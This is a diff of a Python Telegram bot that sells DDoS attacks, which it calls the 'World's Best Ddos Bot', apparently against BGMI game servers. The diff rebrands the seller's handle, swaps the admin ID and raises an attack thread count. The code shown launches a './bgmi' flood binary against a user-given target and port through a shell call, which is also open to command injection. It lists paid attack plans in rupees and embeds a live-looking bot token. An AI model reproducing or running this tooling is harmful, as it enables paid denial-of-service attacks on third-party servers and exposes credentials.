@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#ZAHER (@Hi_cheat1)
+#ZAHER (@Hi_cheat11)
 
 import telebot
 import subprocess
@@ -11,7 +11,7 @@ import os
 bot = telebot.TeleBot('7248601249:AAHCcvqi4fAkddlGJMnJBpiEpYn70FH0Iec')
 
 # Admin user IDs
-admin_id = ["881808734",]
+admin_id = ["6529567486",]
 
 # Files to store user data
 USER_FILE = "users.txt"
@@ -199,7 +199,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"🙍{username}, 🚀𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀 .\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🚪𝐏𝐨𝐫𝐭: {port}\n⏳𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🛡️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI-VIP\n@Hi_cheat1"
+    response = f"🙍{username}, 🚀𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀 .\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🚪𝐏𝐨𝐫𝐭: {port}\n⏳𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🛡️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI-VIP\n@Hi_cheat11"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -233,13 +233,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 320"
+                full_command = f"./bgmi {target} {port} {time} 350"
                 subprocess.run(full_command, shell=True)
                 response = f" 🎮BGMI Attack Finished! 🎮.\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time}"
         else:
-            response = "✅Usage :- /bgmi <target> <port> <time>\n@Hi_cheat1"
+            response = "✅Usage :- /bgmi <target> <port> <time>\n@Hi_cheat11"
     else:
-        response = "🚫You Are Not Authorized To Use This Command🚫.\n@Hi_cheat1"
+        response = "🚫You Are Not Authorized To Use This Command🚫.\n@Hi_cheat11"
 
     bot.reply_to(message, response)
 
@@ -273,7 +273,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- @Hi_cheat1
+ @Hi_cheat11
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -288,7 +288,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"🎉Welcome to Your Home, {user_name}!🎉 \nFeel Free to Explore.Try To Run This Command : /help\n\n🎊Welcome To The World's Best Ddos Bot🤖\n@Hi_cheat1"
+    response = f"🎉Welcome to Your Home, {user_name}!🎉 \nFeel Free to Explore.Try To Run This Command : /help\n\n🎊Welcome To The World's Best Ddos Bot🤖\n@Hi_cheat11"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -299,7 +299,7 @@ def welcome_rules(message):
 1. 🚫Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. ⚠️Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. 🧐We Daily Checks The Logs So Follow these rules to avoid Ban!!
-@Hi_cheat1'''
+@Hi_cheat11'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -316,7 +316,7 @@ Vip :
 1️⃣Day-->200 Rs
 1️⃣Week-->900 Rs
 1️⃣Month-->1600 Rs
-@Hi_cheat1
+@Hi_cheat11
 '''
     bot.reply_to(message, response)
 
@@ -333,7 +333,7 @@ def welcome_admincmd(message):
 /clearlogs : Clear The Logs File.
 /startsub <userId> <days> : Start a subscription for a user.
 /endsub <userId> : End a user's subscription.
-@Hi_cheat1
+@Hi_cheat11
 '''
     bot.reply_to(message, response)
 
@@ -399,6 +399,6 @@ def end_subscription(message):
     bot.reply_to(message, response)
 
 bot.polling()
-#@Hi_cheat1
+#@Hi_cheat11
 
                 
